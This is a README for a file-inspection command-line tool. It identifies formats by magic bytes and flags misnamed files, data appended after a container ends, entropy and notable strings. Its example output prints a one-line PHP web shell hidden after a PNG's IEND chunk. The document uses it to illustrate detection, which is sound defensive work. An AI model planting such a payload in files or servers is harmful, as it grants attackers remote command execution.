# speck

What is actually inside this file?

```console
$ speck identify holiday.jpg
holiday.jpg  PNG image  66 B
  ! the extension .jpg does not match the contents, which are PNG image; this is how a file gets a wrong name, or how one is hidden
  ! 21 bytes follow the IEND chunk of the PNG

$ speck info holiday.jpg
holiday.jpg
  size                 66 B (66 bytes)
  extension            .jpg
  contents             PNG image (image)
  entropy              4.964 bits/byte
  dimensions           1920 x 1080
  bit depth            8 per channel
  colour type          6 (truecolour + alpha)
  warning the extension .jpg does not match the contents
  warning 21 bytes follow the IEND chunk of the PNG

$ speck strings holiday.jpg -n 8
<?php system($_GET[0]); ?>
```

That last line is the interesting one. The file is a real PNG with a real
1920×1080 header, and someone appended a PHP payload after the image ends —
the classic way to make a file that looks like a picture and runs as a script.
The extension says JPEG, the bytes say PNG, and there is something after the
picture. All three are reported.

## Why not `file`

`file` is the tool this is modelled on, and for pure identification it is
better: it has decades of magic patterns behind it. What it does not do is
comment on what it finds. It will tell you a file is a PNG; it will not tell you
that you named it `.jpg`, or that there is data after the end of the image, or
that there are credentials in the printable strings.

speck reads the same way — leading bytes, never the extension — and then says the
part that is usually the reason you looked at the file at all.

## Install

```bash
npx speck identify download.bin

npm install -g speck
speck info suspicious.pdf --hash
```

Node 18.17 or newer. No dependencies.

## Commands

| Command | What it does |
| --- | --- |
| `speck identify <file...>` | The format, and whether the name agrees. One line per file. |
| `speck info <file...>` | Everything worth knowing: size, format, dimensions, archive entries, entropy, hash, notable strings. |
| `speck strings <file>` | Printable ASCII runs, `--min` to set the length. |
| `speck formats` | The 40 formats this build recognises. |

`--json` on any of them gives a machine-readable report.

### Exit codes

| Code | Meaning |
| --- | --- |
| 0 | everything identified, no disagreement |
| 1 | a file could not be read |
| 2 | a file was identified and its extension disagrees with its contents |

That `2` is deliberate: it makes `speck identify *` usable in a script that
wants to know whether anything in a directory is misnamed.

## What it reports

**The format, from the bytes.** 40 formats across executables, archives, images,
documents, media, databases and certificates. An extension is a hint the user
typed; the bytes are what a program acts on, and the two disagree more often than
people expect.

**A name that disagrees with the contents.** Either the file was renamed by
mistake or by hand, or something is being hidden.

**Data after the end of a container.** A PNG has an `IEND` chunk and a ZIP has a
central directory; both say where the file should stop. Bytes past that point are
reported with a count. This is how one file gets hidden inside another.

**Header details worth reading.** PNG and JPEG dimensions, GIF colour tables, WAV
sample rate and duration, ZIP entry count, ELF class and machine, PE subsystem,
gzip original filename, PDF version and whether it is encrypted.

**Entropy.** Bits per byte, from 0 (one repeated byte) to 8 (every byte equally
likely). Near 8 means compressed or encrypted. It is a description, not a
verdict: a JPEG and a ZIP also sit near 8, so the note only appears where the
number is not already explained by the format.

**Notable strings.** Printable runs that are worth flagging on sight: a script
tag, an SVG, a shebang, `BEGIN PRIVATE KEY`, a certificate header, something that
looks like an AWS access key, a URL. `speck strings` dumps everything.

## What it does not do

It does not execute, decompress or decode anything. The file is read, described
and left alone. There is no parser for image data, no archive extraction, no
sandbox, and nothing that could be exploited by a malformed file beyond a bounds
check.

That also means it cannot tell you what is *inside* a ZIP, or whether a PDF is
malicious. It describes the container, not the contents.

It reads the first and last 64 KB. A header that lives beyond that is not seen,
and a ZIP with a central directory further from the end than that is reported as
unread rather than guessed at.

Identification is by magic bytes, so it recognises the formats in
`speck formats` and nothing else. A file with no recognisable header is reported
as text or as unrecognised bytes, which is a real answer but not a useful one if
you were hoping for an exact format.

## Testing

```bash
npm test
```

27 tests. The fixtures build real PNG, ZIP and gzip containers byte by byte
rather than shipping binary files, so the tests show exactly which bytes are
being relied on. The cases that matter are the disagreements: a PNG named `.jpg`,
a payload appended after `IEND`, a truncated header, a file with no header at all.

## License

MIT. See [LICENSE](LICENSE).
